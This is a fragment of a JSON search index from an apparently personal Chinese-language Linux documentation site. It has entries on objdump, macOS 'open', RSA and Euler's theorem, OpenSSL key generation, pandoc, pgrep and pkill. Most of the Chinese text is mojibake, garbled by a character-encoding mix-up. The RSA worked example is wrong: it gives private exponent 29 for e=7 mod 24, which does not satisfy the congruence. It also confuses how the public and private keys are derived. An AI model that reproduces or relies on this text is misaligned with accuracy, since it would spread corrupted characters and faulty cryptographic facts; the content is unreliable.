é€‰é¡¹è½½å…¥ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-objdump.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-objdump.html"},{"title":"open","text":"æ‰“å¼€æ–‡ä»¶ç­‰ åœ¨MacOSä¸Šç”¨æ³• è¯´æ˜ ä»å‘½ä»¤è¡Œæ‰“å¼€æ–‡ä»¶. é»˜è®¤æƒ…å†µä¸‹, ä¼šä½¿ç”¨è¯¥æ–‡ä»¶å¯¹åº”è®¾ç½®çš„é»˜è®¤æ‰“å¼€æ–¹å¼æ‰“å¼€; å¦‚æœæ˜¯æ ¼å¼åŒ–çš„URL, å°†æ‰“å¼€URL ç”¨æ³•: open [-e] [-t] [-f] [-W] [-R] [-n] [-g] [-h] [-s <partial SDK name>][-b <bundle identifier>] [-a <application>] [-u URL] [filenames] [--args arguments] é€‰é¡¹: -a ä½¿ç”¨æŒ‡å®šçš„ç¨‹åºæ‰“å¼€ --arch ARCH ä½¿ç”¨ç»™å®šçš„cpuæ¶æ„ç±»å‹å’Œå­ç±»å‹æ‰“å¼€ -b ä½¿ç”¨æŒ‡å®šçš„ åº”ç”¨ç¨‹åºæ ‡è¯†ç¬¦ æ‰“å¼€ -e ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ -t ä½¿ç”¨é»˜è®¤æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ -f ä»æ ‡å‡†è¾“å…¥è¯»å–è¾“å…¥å¹¶ä½¿ç”¨ TextEdit æ‰“å¼€ -F --fresh Launches the app fresh, that is, without restoring windows. Saved persistent state is lost, excluding Untitled documents. -R, --reveal Selects in the Finder instead of opening. -W, --wait-apps Blocks until the used applications are closed (even if they were already running). --args All remaining arguments are passed in argv to the application's main() function instead of opened. -n, --new Open a new instance of the application even if one is already running. -j, --hide Launches the app hidden. -g, --background Does not bring the application to the foreground. -h, --header Searches header file locations for headers matching the given filenames, and opens them. -s For -h, the SDK to use; if supplied, only SDKs whose names contain the argument value are searched. Otherwise the highest versioned SDK in each platform is used. -u, --url URL Open this URL, even if it matches exactly a filepath -i, --stdin PATH Launches the application with stdin connected to PATH; defaults to /dev/null -o, --stdout PATH Launches the application with /dev/stdout connected to PATH; --stderr PATH Launches the application with /dev/stderr connected to PATH to --env VAR Add an enviroment variable to the launched process, where VAR is formatted AAA=foo or just AAA for a null string value.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-open.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-open.html"},{"title":"RSAç®—æ³•","text":"å‚è€ƒ: https://zhuanlan.zhihu.com/p/48249182 (RSAè¿™ä¸ªå†™çš„æ¯”è¾ƒè¯¦ç»†, ä½†æ˜¯çœ‹ç€å¤´ç–¼, åé¢æœ‰ç©ºç»§ç»­çœ‹) https://www.openssl.net.cn/docs/3.html (è¿™ä¸ªæ˜¯è¯¦ç»†çš„ä¸­æ–‡è¯´æ˜, æ²¡ç©ºçœ‹) å±äº å…¬é’¥åŠ å¯†ç®—æ³• ã€ éå¯¹ç§°åŠ å¯†ç®—æ³• æ¨¡è¿ç®— æ¨¡è¿ç®—å³æ±‚ä½™è¿ç®—ã€‚\"æ¨¡\"æ˜¯\"Mod\"çš„éŸ³è¯‘ã€‚ å’Œæ¨¡è¿ç®—ç´§å¯†ç›¸å…³çš„ä¸€ä¸ªæ¦‚å¿µæ˜¯\"åŒä½™\"ã€‚ æ•°å­¦ä¸Šï¼Œå½“ä¸¤ä¸ªæ•´æ•°é™¤ä»¥åŒä¸€ä¸ªæ­£æ•´æ•°ï¼Œè‹¥å¾—ç›¸åŒä½™æ•°ï¼Œåˆ™äºŒæ•´æ•°åŒä½™ã€‚ ä¸¤ä¸ªæ•´æ•°aï¼Œbï¼Œè‹¥å®ƒä»¬é™¤ä»¥æ­£æ•´æ•°mæ‰€å¾—çš„ä½™æ•°ç›¸ç­‰ï¼Œåˆ™ç§°aï¼Œbå¯¹äºæ¨¡måŒä½™ï¼Œè®°ä½œ: a â‰¡ b (mod m) è¯»ä½œï¼šaåŒä½™äºbæ¨¡mï¼Œæˆ–è€…ï¼Œaä¸bå…³äºæ¨¡måŒä½™ã€‚ä¾‹å¦‚: 26 â‰¡ 14 (mod 12)ã€‚ äº’è´¨å…³ç³» å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°ï¼Œé™¤äº†1ä»¥å¤–ï¼Œæ²¡æœ‰å…¶ä»–å…¬å› å­ï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸¤ä¸ªæ•°æ˜¯äº’è´¨å…³ç³»ï¼ˆcoprimeï¼‰ã€‚ æ¯”å¦‚ï¼Œ15å’Œ32æ²¡æœ‰å…¬å› å­ï¼Œæ‰€ä»¥å®ƒä»¬æ˜¯äº’è´¨å…³ç³»ã€‚è¿™è¯´æ˜ï¼Œä¸æ˜¯è´¨æ•°ä¹Ÿå¯ä»¥æ„æˆäº’è´¨å…³ç³»ã€‚ å…³äºäº’è´¨å…³ç³»ï¼Œä¸éš¾å¾—åˆ°ä»¥ä¸‹ç»“è®ºï¼š ä»»æ„ä¸¤ä¸ªè´¨æ•°æ„æˆäº’è´¨å…³ç³»ï¼Œæ¯”å¦‚13å’Œ61ã€‚ ä¸€ä¸ªæ•°æ˜¯è´¨æ•°ï¼Œå¦ä¸€ä¸ªæ•°åªè¦ä¸æ˜¯å‰è€…çš„å€æ•°ï¼Œä¸¤è€…å°±æ„æˆäº’è´¨å…³ç³»ï¼Œæ¯”å¦‚3å’Œ10ã€‚ å¦‚æœä¸¤ä¸ªæ•°ä¹‹ä¸­ï¼Œè¾ƒå¤§çš„é‚£ä¸ªæ•°æ˜¯è´¨æ•°ï¼Œåˆ™ä¸¤è€…æ„æˆäº’è´¨å…³ç³»ï¼Œæ¯”å¦‚97å’Œ57ã€‚ 1å’Œä»»æ„ä¸€ä¸ªè‡ªç„¶æ•°æ˜¯éƒ½æ˜¯äº’è´¨å…³ç³»ï¼Œæ¯”å¦‚1å’Œ99ã€‚ pæ˜¯å¤§äº1çš„æ•´æ•°ï¼Œåˆ™på’Œp-1æ„æˆäº’è´¨å…³ç³»ï¼Œæ¯”å¦‚57å’Œ56ã€‚ pæ˜¯å¤§äº1çš„å¥‡æ•°ï¼Œåˆ™på’Œp-2æ„æˆäº’è´¨å…³ç³»ï¼Œæ¯”å¦‚17å’Œ15ã€‚ æ¬§æ‹‰å‡½æ•° æ€è€ƒä»¥ä¸‹é—®é¢˜:: ä»»æ„ç»™å®šæ­£æ•´æ•°nï¼Œè¯·é—®åœ¨å°äºç­‰äºnçš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªä¸næ„æˆäº’è´¨å…³ç³»ï¼Ÿï¼ˆæ¯”å¦‚ï¼Œåœ¨1åˆ°8ä¹‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªæ•°ä¸8æ„æˆäº’è´¨å…³ç³»ï¼Ÿï¼‰ è®¡ç®—è¿™ä¸ªå€¼çš„æ–¹æ³•å°±å«åšæ¬§æ‹‰å‡½æ•°ï¼Œä»¥Ï†(n)è¡¨ç¤ºã€‚åœ¨1åˆ°8ä¹‹ä¸­ï¼Œä¸8å½¢æˆäº’è´¨å…³ç³»çš„æ˜¯1ã€3ã€5ã€7ï¼Œæ‰€ä»¥ Ï†(n) = 4ã€‚ ç¬¬ä¸€ç§æƒ…å†µ å¦‚æœn=1ï¼Œåˆ™ Ï†(1) = 1 ã€‚å› ä¸º1ä¸ä»»ä½•æ•°ï¼ˆåŒ…æ‹¬è‡ªèº«ï¼‰éƒ½æ„æˆäº’è´¨å…³ç³»ã€‚ ç¬¬äºŒç§æƒ…å†µ å¦‚æœnæ˜¯è´¨æ•°ï¼Œåˆ™ Ï†(n)=n-1 ã€‚å› ä¸ºè´¨æ•°ä¸å°äºå®ƒçš„æ¯ä¸€ä¸ªæ•°ï¼Œéƒ½æ„æˆäº’è´¨å…³ç³»ã€‚æ¯”å¦‚5ä¸1ã€2ã€3ã€4éƒ½æ„æˆäº’è´¨å…³ç³»ã€‚ ç¬¬ä¸‰ç§æƒ…å†µ å¦‚æœnæ˜¯è´¨æ•°çš„æŸä¸€ä¸ªæ¬¡æ–¹ï¼Œå³ n = p&#94;k (pä¸ºè´¨æ•°ï¼Œkä¸ºå¤§äºç­‰äº1çš„æ•´æ•°)ï¼Œåˆ™ Ï† ( n ) = Ï† ( p k ) = p k âˆ’ p k âˆ’ 1 æ¯”å¦‚: Ï†(8) = Ï†(2&#94;3) =2&#94;3 - 2&#94;2 = 8 -4 = 4ã€‚ è¿™æ˜¯å› ä¸ºåªæœ‰å½“ä¸€ä¸ªæ•°ä¸åŒ…å«è´¨æ•°p(åŒ…å«æ˜¯æŒ‡æ˜¯è´¨æ•°pçš„å€æ•°)ï¼Œ æ‰å¯èƒ½ä¸näº’è´¨(å› ä¸ºè‹¥ä¸€ä¸ªæ•°åŒ…å«è´¨æ•°p, åˆ™ä¸æ»¡è¶³ äº’è´¨å…³ç³»ç»“è®º ç¬¬äºŒç‚¹). è€ŒåŒ…å«è´¨æ•°pçš„æ•°ä¸€å…±æœ‰p&#94;(k-1)ä¸ªï¼Œå³1Ã—pã€2Ã—pã€3Ã—pã€...ã€p&#94;(k-1)Ã—p, è¿™é‡Œå¯ä»¥æ¨å¯¼: - ç¬¬ä¸€ä¸ªæ•°æ˜¯1xp, æ˜¯ç¬¬ä¸€ä¸ª - ç¬¬äºŒä¸ªæ•°æ˜¯2xp, æ˜¯ç¬¬äºŒä¸ª - \\.\\.\\. - æœ€åä¸€ä¸ªæ•°æ˜¯p&#94;(k-1)Ã—p, æ˜¯ç¬¬p&#94;(k-1)ä¸ª æ•…ä¸€å…±æœ‰ p&#94;(k-1) ä¸ªåŒ…å«pçš„æ•°. æŠŠå®ƒä»¬å»é™¤ï¼Œå‰©ä¸‹çš„å°±æ˜¯ä¸näº’è´¨çš„æ•°ã€‚ ä¸Šé¢çš„å¼å­è¿˜å¯ä»¥å†™æˆä¸‹é¢çš„å½¢å¼: Ï† ( n ) = Ï† ( p k ) = p k âˆ’ p k âˆ’ 1 = p k (1 âˆ’ ( 1 )/( p ) ) å¯ä»¥çœ‹å‡ºï¼Œä¸Šé¢çš„ç¬¬äºŒç§æƒ…å†µæ˜¯ k=1 æ—¶çš„ç‰¹ä¾‹ã€‚ ç¬¬å››ç§æƒ…å†µ å¦‚æœnå¯ä»¥åˆ†è§£æˆä¸¤ä¸ªäº’è´¨çš„æ•´æ•°ä¹‹ç§¯: n = p1 Ã— p2 åˆ™: Ï†(n) = Ï†(p1p2) = Ï†(p1)Ï†(p2) å³ç§¯çš„æ¬§æ‹‰å‡½æ•°ç­‰äºå„ä¸ªå› å­çš„æ¬§æ‹‰å‡½æ•°ä¹‹ç§¯ã€‚æ¯”å¦‚: Ï†(56)=Ï†(8Ã—7)=Ï†(8)Ã—Ï†(7)=4Ã—6=24ã€‚ è¿™ä¸€æ¡çš„è¯æ˜è¦ç”¨åˆ°\"ä¸­å›½å‰©ä½™å®šç†\"ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼Œåªç®€å•è¯´ä¸€ä¸‹æ€è·¯: å¦‚æœaä¸p1äº’è´¨(a < p1)ï¼Œbä¸p2äº’è´¨(b < p2)ï¼Œcä¸p1p2äº’è´¨(c < p1p2)ï¼Œåˆ™cä¸æ•°å¯¹ (a,b) æ˜¯ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚ ç”±äºaçš„å€¼æœ‰Ï†(p1)ç§å¯èƒ½ï¼Œbçš„å€¼æœ‰Ï†(p2)ç§å¯èƒ½ï¼Œåˆ™æ•°å¯¹ (a,b) æœ‰Ï†(p1)Ï†(p2)ç§å¯èƒ½ï¼Œè€Œcçš„å€¼æœ‰Ï†(p1p2)ç§å¯èƒ½ï¼Œ æ‰€ä»¥Ï†(p1p2)å°±ç­‰äºÏ†(p1)Ï†(p2)ã€‚ ç¬¬äº”ç§æƒ…å†µ å› ä¸ºä»»æ„ä¸€ä¸ªå¤§äº1çš„æ­£æ•´æ•°ï¼Œéƒ½å¯ä»¥å†™æˆä¸€ç³»åˆ—è´¨æ•°çš„ç§¯ n = p k 1 1 p k 2 2 ... p kr r æ ¹æ® ç¬¬å››ç§æƒ…å†µ ç»“è®ºï¼Œå¾—åˆ° Ï† ( n ) = Ï† ( p k 1 1 ) Ï† ( p k 2 2 )... Ï† ( p kr r ) å†æ ¹æ® ç¬¬ä¸‰ç§æƒ…å†µ çš„ç»“è®ºï¼Œå¾—åˆ° Ï† ( n ) = p k 1 1 (1 âˆ’ ( 1 )/( p 1 ) ) p k 2 2 (1 âˆ’ ( 1 )/( p 2 ) )... p kr r (1 âˆ’ ( 1 )/( p r ) ) ä¹Ÿå°±ç­‰äº Ï† ( n ) = n (1 âˆ’ ( 1 )/( p 1 ) )(1 âˆ’ ( 1 )/( p 2 ) )...(1 âˆ’ ( 1 )/( p r ) ) è¿™å°±æ˜¯æ¬§æ‹‰å‡½æ•°çš„é€šç”¨è®¡ç®—å…¬å¼ã€‚æ¯”å¦‚ï¼Œ1323çš„æ¬§æ‹‰å‡½æ•°ï¼Œè®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ Ï† (1323) = Ï† (3 3 x 7 2 ) = 1323(1 âˆ’ ( 1 )/( 3 ) )(1 âˆ’ ( 1 )/( 7 ) ) = 756 æ¬§æ‹‰å®šç† æ¬§æ‹‰å‡½æ•°çš„ç”¨å¤„ï¼Œåœ¨äºæ¬§æ‹‰å®šç†ã€‚\"æ¬§æ‹‰å®šç†\"æŒ‡çš„æ˜¯: å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°aå’Œnäº’è´¨ï¼Œåˆ™nçš„æ¬§æ‹‰å‡½æ•° Ï†(n) å¯ä»¥è®©ä¸‹é¢çš„ç­‰å¼æˆç«‹ a Ï† ( n ) â‰¡ 1 ( mod n ) ä¹Ÿå°±æ˜¯è¯´ï¼Œaçš„Ï†(n)æ¬¡æ–¹è¢«né™¤çš„ä½™æ•°ä¸º1ã€‚æˆ–è€…è¯´ï¼Œaçš„Ï†(n)æ¬¡æ–¹å‡å»1ï¼Œå¯ä»¥è¢«næ•´é™¤ã€‚ æ¯”å¦‚ï¼Œ3å’Œ7äº’è´¨ï¼Œè€Œ7çš„æ¬§æ‹‰å‡½æ•°Ï†(7)ç­‰äº6ï¼Œæ‰€ä»¥3çš„6æ¬¡æ–¹ï¼ˆ729ï¼‰å‡å»1ï¼Œå¯ä»¥è¢«7æ•´é™¤ï¼ˆ728/7=104ï¼‰ã€‚ æ¬§æ‹‰å®šç†æœ‰ä¸€ä¸ªç‰¹æ®Šæƒ…å†µã€‚ å‡è®¾æ­£æ•´æ•°aä¸è´¨æ•°päº’è´¨ï¼Œå› ä¸ºè´¨æ•°pçš„Ï†(p)ç­‰äºp-1ï¼Œåˆ™æ¬§æ‹‰å®šç†å¯ä»¥å†™æˆ a p âˆ’ 1 â‰¡ 1 ( mod p ) è¿™å°±æ˜¯è‘—åçš„è´¹é©¬å°å®šç†ã€‚å®ƒæ˜¯æ¬§æ‹‰å®šç†çš„ç‰¹ä¾‹ã€‚ æ¬§æ‹‰å®šç†æ˜¯RSAç®—æ³•çš„æ ¸å¿ƒã€‚ç†è§£äº†è¿™ä¸ªå®šç†ï¼Œå°±å¯ä»¥ç†è§£RSAã€‚ æ¨¡åå…ƒç´  è¿˜å‰©ä¸‹æœ€åä¸€ä¸ªæ¦‚å¿µï¼š å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°aå’Œnäº’è´¨ï¼Œé‚£ä¹ˆä¸€å®šå¯ä»¥æ‰¾åˆ°æ•´æ•°bï¼Œä½¿å¾—ab-1è¢«næ•´é™¤ï¼Œæˆ–è€…è¯´abè¢«né™¤çš„ä½™æ•°æ˜¯1. è¿™æ—¶ï¼Œbå°±å«åšaçš„\"æ¨¡åå…ƒç´ \"ã€‚ æ¯”å¦‚ï¼Œ3å’Œ11äº’è´¨ï¼Œé‚£ä¹ˆ3çš„æ¨¡åå…ƒç´ å°±æ˜¯4ï¼Œå› ä¸º (3 Ã— 4)-1 å¯ä»¥è¢«11æ•´é™¤ã€‚ æ˜¾ç„¶ï¼Œæ¨¡åå…ƒç´ ä¸æ­¢ä¸€ä¸ªï¼Œ 4åŠ å‡11çš„æ•´æ•°å€éƒ½æ˜¯3çš„æ¨¡åå…ƒç´  {â€¦,-18,-7,4,15,26,â€¦}ï¼Œ å³å¦‚æœbæ˜¯açš„æ¨¡åå…ƒç´ ï¼Œåˆ™ b+kn éƒ½æ˜¯açš„æ¨¡åå…ƒç´ ã€‚ æ¬§æ‹‰å®šç†å¯ä»¥ç”¨æ¥è¯æ˜æ¨¡åå…ƒç´ å¿…ç„¶å­˜åœ¨ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œaçš„ Ï†(n)-1 æ¬¡æ–¹ï¼Œå°±æ˜¯açš„æ¨¡åå…ƒç´ ã€‚ RSAç”Ÿæˆç®—æ³• å…·ä½“æ¥è¯´: é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œq,è®¡ç®—n=pq,ä¸”æ¬§æ‹‰å‡½æ•°Ï†(n)=(p-1)(q-1) é€‰æ‹©ä¸Ï†(n)äº’è´¨çš„æ•´æ•°e,eå°±æ˜¯å…¬é’¥æŒ‡æ•° è®¡ç®—d,æ»¡è¶³edâ‰¡1(mod Ï†(n)),då°±æ˜¯ç§é’¥æŒ‡æ•° (n,e)å°±æ˜¯å…¬é’¥,(n,d)å°±æ˜¯ç§é’¥ è¿™é‡Œå…¬é’¥(n,e)æ˜¯ä»ç§é’¥(n,d)æ¨å¯¼è®¡ç®—å‡ºæ¥çš„,è€Œæ— æ³•ç”±å…¬é’¥åæ¨ç§é’¥ã€‚ ä¸¾ä¸ªç®€å•ä¾‹å­: p=5,q=7 n=5*7=35 Ï†(n)=(p-1)(q-1)=4*6=24 é€‰æ‹©e=7,ä¸24äº’è´¨, åˆ™d=7çš„ä¹˜æ³•é€†å…ƒmod 24=29, åˆ™: å…¬é’¥(n=35, e=7) ç§é’¥(n=35, d=29) å¯ä»¥çœ‹å‡º,å…¬é’¥æ˜¯ä»é€‰æ‹©çš„dè®¡ç®—å¾—åˆ°çš„e,ä½†æ— æ³•ç”±eåæ¨å‡ºdã€‚ æ‰€ä»¥,RSAç®—æ³•è¦æ±‚ç§é’¥ç”Ÿæˆå…¬é’¥,è€Œä¸èƒ½ç”±å…¬é’¥ç”Ÿæˆç§é’¥,è¿™æ˜¯RSAç®—æ³•çš„åŸºæœ¬åŸç†å’Œè¦æ±‚ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html"},{"title":"ä¸€äº›é—®é¢˜è¯´æ˜","text":"ä¸ºä»€ä¹ˆRSAç®—æ³•è¦å…ˆç”Ÿæˆç§é’¥, å†æ¨å¯¼å…¬é’¥ RSAè¯´æ˜å¯è§: RSAç”Ÿæˆç®—æ³• <R_RSAç”Ÿæˆç®—æ³•> åœ¨opensslä¸­,æˆ‘ä»¬ä¸€èˆ¬: ç”¨genrsaç”ŸæˆRSAç§é’¥ ç”¨rsaæ¨å¯¼å‡ºRSAå…¬é’¥ è€Œä¸èƒ½: è‡ªå·±é€‰æ‹©nå’Œeç”Ÿæˆå…¬é’¥ å†ç”±å…¬é’¥åæ¨ç§é’¥d è¿™è¿åäº†RSAç®—æ³•çš„åŸºæœ¬åŸç†,ç ´åäº†å…¶å®‰å…¨æ€§ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html"},{"title":"pandoc","text":"ä¸€ä¸ªå¼€æºçš„æ–‡æ¡£è½¬æ¢å·¥å…·, æ”¯æŒå¤šç§æ–‡æ¡£æ ¼å¼ä¹‹é—´çš„äº’ç›¸è½¬æ¢. å®‰è£…: apt install pandoc ä½¿ç”¨ä¸¾ä¾‹, å°†mdè½¬æ¢ä¸ºhtml: pandoc test.md -f markdown -t html -s -o test.html ä¸€äº›å¸¸ç”¨é€‰é¡¹: -f FORMAT, -r FORMAT --from=FORMAT, --read=FORMAT è¾“å…¥æ–‡ä»¶æ ¼å¼ -t FORMAT, -w FORMAT --to=FORMAT, --write=FORMAT è¾“å‡ºæ–‡ä»¶æ ¼å¼, æŸäº›æ”¯æŒè‡ªåŠ¨é€šè¿‡åç¼€è¯†åˆ«. -o FILE, --output=FILE è¾“å‡ºæ–‡ä»¶ä½ç½® -M <KEY[:VALUE]>, --metadata=KEY[:VALUE], --metadata-file=FILE --data-dir= DIRECTORY ä¾èµ–ç›®å½• -d <FILE> --defaults=FILE --file-scope --sandbox -s --standalone, ç‹¬ç«‹æˆä¸€ä¸ªæ–‡ä»¶? --template=FILE -V <KEY[:VALUE]> --variable=KEY[:VALUE] --wrap=auto|none|preserve --ascii --toc, --table-of-contents --toc-depth=NUMBER -N --number-sections --number-offset=NUMBERS --top-level-division=section|chapter|part --extract-media= PATH è¾“å‡ºå›¾ç‰‡ç›®å½•, æ¯”å¦‚å°†docè½¬æ¢ä¸ºrstæ—¶ --resource-path=SEARCHPATH -H FILE --include-in-header=FILE -B FILE --include-before-body=FILE -A FILE --include-after-body=FILE --no-highlight --highlight-style=STYLE|FILE --syntax-definition=FILE --dpi=NUMBER --eol=crlf|lf|native --columns=NUMBER -p --preserve-tabs --tab-stop=NUMBER --pdf-engine=PROGRAM --pdf-engine-opt=STRING --reference-doc= FILE è¾“å‡ºdocæ¨¡ç‰ˆæ–‡ä»¶ï¼Œä½¿ç”¨æ¨¡ç‰ˆæ–‡ä»¶è½¬æ¢å¯ä»¥æŠŠæ ‡é¢˜ä¹‹ç±»çš„æ ¼å¼æå¾—æ›´è§„èŒƒ --self-contained --embed-resources --request-header=NAME:VALUE --no-check-certificate --abbreviations=FILE --indented-code-classes=STRING --default-image-extension=extension -F PROGRAM --filter=PROGRAM -L SCRIPTPATH --lua-filter=SCRIPTPATH --shift-heading-level-by=NUMBER --base-header-level=NUMBER --track-changes=accept|reject|all --strip-comments --reference-links --reference-location=block|section|document --markdown-headings=setext|atx --list-tables --listings -i --incremental --slide-level=NUMBER --section-divs --html-q-tags --email-obfuscation=none|javascript|references --id-prefix=STRING -T STRING --title-prefix=STRING -c URL --css=URL --epub-subdirectory=DIRNAME --epub-cover-image=FILE --epub-title-page=true|false --epub-metadata=FILE --epub-embed-font=FILE --split-level=NUMBER --chunk-template=PATHTEMPLATE --epub-chapter-level=NUMBER --ipynb-output=all|none|best -C --citeproc --bibliography=FILE --csl=FILE --citation-abbreviations=FILE --natbib --biblatex --mathml --webtex[=URL] --mathjax[=URL] --katex[=URL] --gladtex --trace --dump-args --ignore-args --verbose --quiet --fail-if-warnings --log=FILE --bash-completion --list-input-formats --list-output-formats --list-extensions[=FORMAT] --list-highlight-languages --list-highlight-styles -D FORMAT --print-default-template=FORMAT --print-default-data-file=FILE --print-highlight-style=STYLE|FILE -v --version -h --help","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pandoc.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pandoc.html"},{"title":"pgrep","text":"pgrepé€šè¿‡åŒ¹é…å…¶ç¨‹åºå, è·å¾—æ­£åœ¨è¢«è°ƒåº¦çš„è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ å¸¸è§é€‰é¡¹: -l åŒæ—¶æ˜¾ç¤ºè¿›ç¨‹åå’ŒPID -o å½“åŒ¹é…å¤šä¸ªè¿›ç¨‹æ—¶ï¼Œæ˜¾ç¤ºè¿›ç¨‹å·æœ€å°çš„é‚£ä¸ª -n å½“åŒ¹é…å¤šä¸ªè¿›ç¨‹æ—¶ï¼Œæ˜¾ç¤ºè¿›ç¨‹å·æœ€å¤§çš„é‚£ä¸ª æ³¨è§£ è¿›ç¨‹å·è¶Šå¤§ï¼Œå¹¶ä¸ä¸€å®šæ„å‘³ç€è¿›ç¨‹çš„å¯åŠ¨æ—¶é—´è¶Šæ™š pgrepæŸ¥æ‰¾çš„æ˜¯ç¨‹åºåï¼Œä¸åŒ…æ‹¬å…¶å‚æ•° pgrepç›¸å½“äº: ps â€“eo pid,cmd | awk â€˜{print $1,$2}' | grep KeyWord","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pgrep.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pgrep.html"},{"title":"pkill","text":"ç±»ä¼¼çš„æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/killall /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/kill å½“ä½œäºç®¡ç†è¿›ç¨‹æ—¶ï¼Œpkill å‘½ä»¤å’Œ killall å‘½ä»¤çš„ç”¨æ³•ç›¸åŒï¼Œ éƒ½æ˜¯é€šè¿‡è¿›ç¨‹åæ€æ­»ä¸€ç±»è¿›ç¨‹ï¼Œè¯¥å‘½ä»¤çš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹: [root@localhost ~]# pkill [ä¿¡å·] è¿›ç¨‹å æ³¨è§£ å³ä½¿è¿›ç¨‹æ˜¯ä»¥ç»å¯¹/ç›¸å¯¹è·¯å¾„å¯åŠ¨, è¿›ç¨‹åä¹Ÿæ˜¯ç›´æ¥å†™æœ€ç»ˆå¯åŠ¨çš„é‚£ä¸ªæ–‡ä»¶åå³å¯, å¦‚ä½¿ç”¨ /usr/bin/top å¯åŠ¨äº†ä¸ª top , ä½¿ç”¨ pkill -9 top æ€æ­» pkill å‘½ä»¤å¸¸ç”¨ä¿¡å·åŠå…¶å«ä¹‰ ä¿¡å·ç¼–å· ä¿¡å·å å«ä¹‰ 0 EXIT ç¨‹åºé€€å‡ºæ—¶æ”¶åˆ°è¯¥ä¿¡æ¯ 1 HUP æŒ‚æ‰ç”µè¯çº¿æˆ–ç»ˆç«¯è¿æ¥çš„ æŒ‚èµ·ä¿¡å·ï¼Œè¿™ä¸ªä¿¡å·ä¹Ÿä¼š é€ æˆæŸäº›è¿›ç¨‹åœ¨æ²¡æœ‰ç»ˆæ­¢ çš„æƒ…å†µä¸‹é‡æ–°åˆå§‹åŒ– 2 INT è¡¨ç¤ºç»“æŸè¿›ç¨‹ï¼Œä½†å¹¶ä¸æ˜¯ å¼ºåˆ¶æ€§çš„ï¼Œå¸¸ç”¨çš„ \"Ctrl+C\" ç»„åˆé”®å‘å‡º å°±æ˜¯ä¸€ä¸ª kill -2 çš„ä¿¡å· 3 QUIT é€€å‡ºã€‚ 9 KILL æ€æ­»è¿›ç¨‹ï¼Œå³å¼ºåˆ¶ç»“æŸè¿›ç¨‹ 11 SEGV æ®µé”™è¯¯ 15 TERM æ­£å¸¸ç»“æŸè¿›ç¨‹ æ˜¯ kill å‘½ä»¤çš„é»˜è®¤ä¿¡å· è¿˜å¯ä»¥è¸¢å‡ºç™»é™†ç”¨æˆ· é™¤æ­¤ä¹‹å¤–ï¼Œpkill è¿˜æœ‰ä¸€ä¸ªæ›´é‡è¦çš„åŠŸèƒ½ï¼Œå³æŒ‰ç…§ç»ˆç«¯å·æ¥è¸¢å‡ºç”¨æˆ·ç™»å½•ï¼Œ æ­¤æ—¶çš„ pkill å‘½ä»¤çš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹: pkill [-t ç»ˆç«¯å·] è¿›ç¨‹å [-t ç»ˆç«¯å·] é€‰é¡¹ç”¨äºæŒ‰ç…§ç»ˆç«¯å·è¸¢å‡ºç”¨æˆ· å­¦ä¹  killall å‘½ä»¤æ—¶ï¼Œä¸çŸ¥é“å¤§å®¶å‘ç°æ²¡æœ‰ï¼Œé€šè¿‡ killall å‘½ä»¤æ€æ­» sshd è¿›ç¨‹çš„æ–¹å¼æ¥è¸¢å‡ºç”¨æˆ·ï¼Œ éå¸¸å®¹æ˜“è¯¯æ€æ­»è¿›ç¨‹ï¼Œè¦ä¹ˆä¼šæŠŠ sshd æœåŠ¡æ€æ­»ï¼Œè¦ä¹ˆä¼šæŠŠè‡ªå·±çš„ç™»å½•ç»ˆç«¯æ€æ­» æ‰€ä»¥ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨ kill å‘½ä»¤æŒ‰ç…§ PID æ€æ­»ç™»å½•è¿›ç¨‹ï¼Œè¿˜æ˜¯ä½¿ç”¨ killall å‘½ä»¤æŒ‰ç…§è¿›ç¨‹åæ€æ­»ç™»å½•è¿›ç¨‹ï¼Œ éƒ½æ˜¯éå¸¸å®¹æ˜“è¯¯æ€æ­»è¿›ç¨‹çš„ï¼Œè€Œä½¿ç”¨ pkill å‘½ä»¤åˆ™ä¸ä¼šï¼Œä¸¾ä¸ªä¾‹å­, ä½¿ç”¨wå‘½ä»¤æŸ¥è¯¢æœ¬æœºå·²ç»ç™»å½•çš„ç”¨æˆ·: [root@localhost ~]# w 20:06:34 up 28 min, 3 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root ttyl - 19:47 18:52 0.01s 0.01s -bash root pts/0 192.168.0.100 19:47 0.00s 0.09s 0.04s w root pts/1 192.168.0.100 19:51 14:56 0.02s 